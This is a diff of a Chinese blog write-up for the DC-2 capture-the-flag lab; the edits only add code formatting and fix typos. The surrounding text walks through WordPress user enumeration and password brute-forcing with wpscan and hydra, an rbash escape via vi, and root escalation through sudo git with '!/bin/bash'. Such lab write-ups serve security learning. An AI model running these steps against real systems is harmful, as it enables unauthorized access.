@@ -267,19 +267,19 @@ HOP RTT     ADDRESS
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130211613.png" srcset="/img/loading.gif" alt=""></p>
 <p>进入网站就可以看到flag1了</p>
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130211647.png" srcset="/img/loading.gif" alt=""></p>
-<p>关键词是wordlist（字典），cewl（一共工具）</p>
+<p>关键词是<code>wordlist</code>（字典），<code>cewl</code></p>
 <blockquote>
 <p>Cewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。</p>
 </blockquote>
 <p>提示应该是在说，登陆的穷举，你的字典应该是没用的了，需要用cwel去生成关键词词典去暴力破解，下一个flag需要登陆才可以获取</p>
-<p>而且外卖可以在网站的底部发现一行：<strong>Proudly powered by WordPress</strong> </p>
-<p>那么这个网站应该是<code>wordpress</code>搭建，我们先来看看登陆目录吧，先扫一下目录</p>
+<p>而且我们可以在网站的底部发现一行：<strong>Proudly powered by WordPress</strong> </p>
+<p>那么这个网站应该是<code>WordPress</code>搭建，我们先来看看登陆目录吧，先扫一下目录</p>
 <h2 id="dirb穷举目录"><a href="#dirb穷举目录" class="headerlink" title="dirb穷举目录"></a>dirb穷举目录</h2><p>一下子就找到入口了,是默认的管理登陆路径</p>
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201205162841.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="wpscan穷举账号"><a href="#wpscan穷举账号" class="headerlink" title="wpscan穷举账号"></a>wpscan穷举账号</h2><blockquote>
 <p><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，它可以为所有 <code>Web</code> 开发人员扫描 <code>WordPress</code> 漏洞并在他们开发前找到并解决问题。</p>
 </blockquote>
-<p>这里使用wpscan可以穷举出账号</p>
+<p>这里使用<code>wpscan</code>可以穷举出账号</p>
 <pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># wpscan --url http://dc-2/ -e u</span></code></pre>
 
 <p>wp版本信息</p>
@@ -319,7 +319,7 @@ dc2pass.txt  dc2user.txt</code></pre>
 <pre><code class="hljs bash">[SUCCESS] - jerry / adipiscing                                                        
 [SUCCESS] - tom / parturient</code></pre>
 
-<p>尝试登陆两个账户寻找有用信息,在jerry里找到flag2。提示我们wp方向如果走不下去，就试试其他方式，还有ssh</p>
+<p>尝试登陆两个账户寻找有用信息,在<code>jerry</code>里找到<code>flag2</code>。提示我们wp方向如果走不下去，就试试其他方式，还有<code>ssh</code></p>
 <p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20201130223355.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="hydra穷举ssh（7744端口flag3）"><a href="#hydra穷举ssh（7744端口flag3）" class="headerlink" title="hydra穷举ssh（7744端口flag3）"></a>hydra穷举ssh（7744端口flag3）</h2><p>只找到了一个，登陆它</p>
 <pre><code class="hljs bash">root@kali:~/DC<span class="hljs-comment"># hydra -L dc2user.txt -P dc2pass.txt ssh://10.0.2.5:7744 -f -vV</span></code></pre>
@@ -340,7 +340,7 @@ Last login: Tue Aug  4 22:40:40 2020 from 192.168.0.108</span></code></pre>
 
 
 
-<p>发现许多命令不可以使用，原因是rbash限制，需要逃逸rbash</p>
+<p>发现许多命令不可以使用，原因是<code>rbash</code>限制，需要逃逸<code>rbash</code></p>
 <pre><code class="hljs bash">tom@DC-2:~$ whoami
 -rbash: whoami: <span class="hljs-built_in">command</span> not found
 tom@DC-2:~$ id
@@ -351,27 +351,27 @@ tom@DC-2:~$ <span class="hljs-built_in">cd</span> usr
 -rbash: <span class="hljs-built_in">cd</span>: restricted</code></pre>
 
 <blockquote>
-<p><strong>受限shell</strong>是LinuxShell限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p>
+<p><strong>受限shell</strong>是<code>LinuxShell</code>限制一些bash shell中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限shell中运行。 它为Linux中的bash shell提供了一个额外的安全层。</p>
 </blockquote>
 <h3 id="vi绕过rbash"><a href="#vi绕过rbash" class="headerlink" title="vi绕过rbash"></a>vi绕过rbash</h3><ol>
 <li>vi</li>
 <li>:set shell=/bin/shell</li>
 <li>:shell</li>
 </ol>
-<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>其实，在探索rbash的过程中发现less可以使用，flag里面没有内容，flag3拿到</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>其实，在探索<code>rbash</code>的过程中发现less可以使用，flag里面没有内容，<code>flag3</code>拿到</p>
 <pre><code class="hljs bash">tom@DC-2:~$ less flag.txt
 tom@DC-2:~$ less flag3.txt</code></pre>
 
 <p><strong>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</strong></p>
-<p>提示的意思应该是，Tom的权限比Jerry小，<strong>应该su提权</strong>。但是当前无法使用su命令</p>
-<h2 id="提权到jerry"><a href="#提权到jerry" class="headerlink" title="提权到jerry"></a>提权到jerry</h2><p>这时我们需要知道su命令是无法使用的，所以我们无法<strong>提权到jerry用户</strong>，我们先来看看我们现在可以执行那些命令</p>
+<p>提示的意思应该是，<code>tom</code>的权限比<code>jerry</code>小，<strong>应该su提权</strong>。但是当前无法使用<code>su</code>命令</p>
+<h2 id="提权到jerry"><a href="#提权到jerry" class="headerlink" title="提权到jerry"></a>提权到jerry</h2><p>这时我们需要知道<code>su</code>命令是无法使用的，所以我们无法<strong>提权到jerry用户</strong>，我们先来看看我们现在可以执行那些命令</p>
 <pre><code class="hljs bash">tom@DC-2:~$ <span class="hljs-variable">$PATH</span>
 bash: /home/tom/usr/bin: Is a directory
 tom@DC-2:~$ <span class="hljs-built_in">cd</span> /home/tom/usr/bin
 tom@DC-2:~/usr/bin$ ls
 less  ls  scp  vi</code></pre>
 
-<p>可以看到我只能执行四个命令，所以要设置新的$PATH变量才可以使用其他的命令，相当于我们还没有从rbash逃逸出来</p>
+<p>可以看到我只能执行四个命令，所以要设置新的<code>$PATH</code>变量才可以使用其他的命令，相当于我们还没有从rbash逃逸出来</p>
 <blockquote>
 <pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># echo $PATH</span>
 /usr/<span class="hljs-built_in">local</span>/sbin:/usr/sbin:/sbin:/usr/<span class="hljs-built_in">local</span>/bin:/usr/bin:/bin:/root/bin</code></pre>
@@ -394,13 +394,13 @@ bash: PATH:/bin:/sbin:/usr/bin:/usr/sbin: No such file or directory</code></pre>
 <p><strong>/usr/sbin目录:</strong> </p>
 <p>放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等</p>
 </blockquote>
-<p>这样我们就可以执行这些环境里面所有的命令了，可以使用su提权到jerry</p>
+<p>这样我们就可以执行这些环境里面所有的命令了，可以使用su提权到<code>jerry</code></p>
 <pre><code class="hljs bash">tom@DC-2:~$ su jerry
 Password: 
 jerry@DC-2:/home/tom$ whoami
 jerry</code></pre>
 
-<p>然后进入jerry的用户目录，可以发现flag4了</p>
+<p>然后进入jerry的用户目录，可以发现<code>flag4</code>了</p>
 <pre><code class="hljs bash">jerry@DC-2:/home/tom$ ls
 ls: cannot open directory .: Permission denied
 jerry@DC-2:/home/tom$ <span class="hljs-built_in">cd</span> ..
@@ -418,8 +418,8 @@ No hints here - you<span class="hljs-string">'re on your own now.  :-)
 
 Go on - git outta here!!!!</span></code></pre>
 
-<p>flag4的提示是说要用git，应该是最后的flag需要用git这个命令去提权到root</p>
-<h2 id="git提权（final-flag）"><a href="#git提权（final-flag）" class="headerlink" title="git提权（final-flag）"></a>git提权（final-flag）</h2><p>这里的sudo -l的意思是，sudo git不需要输入密码直接使用，而其他的（sudo command）需要输入root密码使用</p>
+<p><code>flag4</code>的提示是说要用<code>git</code>，应该是最后的flag需要用<code>git</code>这个命令去提权到root</p>
+<h2 id="git提权（final-flag）"><a href="#git提权（final-flag）" class="headerlink" title="git提权（final-flag）"></a>git提权（final-flag）</h2><p>这里的<code>sudo -l</code>的意思是，<code>sudo git</code>不需要输入密码直接使用，而其他的（<code>sudo command</code>）需要输入root密码使用</p>
 <pre><code class="hljs bash">jerry@DC-2:~$ sudo -l
 Matching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:
     env_reset, mail_badpass, secure_path=/usr/<span class="hljs-built_in">local</span>/sbin\:/usr/<span class="hljs-built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -441,7 +441,7 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
 <p><strong>!/bin/bash</strong>或者！’sh’完成提权 </p>
 <p>sudo git  -p help !/bin/bash</p>
 </blockquote>
-<p>拿到最后的flag</p>
+<p>拿到<code>最后的flag</code></p>
 <pre><code class="hljs bash">root@DC-2:~<span class="hljs-comment"># cat final-flag.txt </span>
  __    __     _ _       _                    _ 
 / / /\ \ \___| | |   __| | ___  _ __   ___  / \
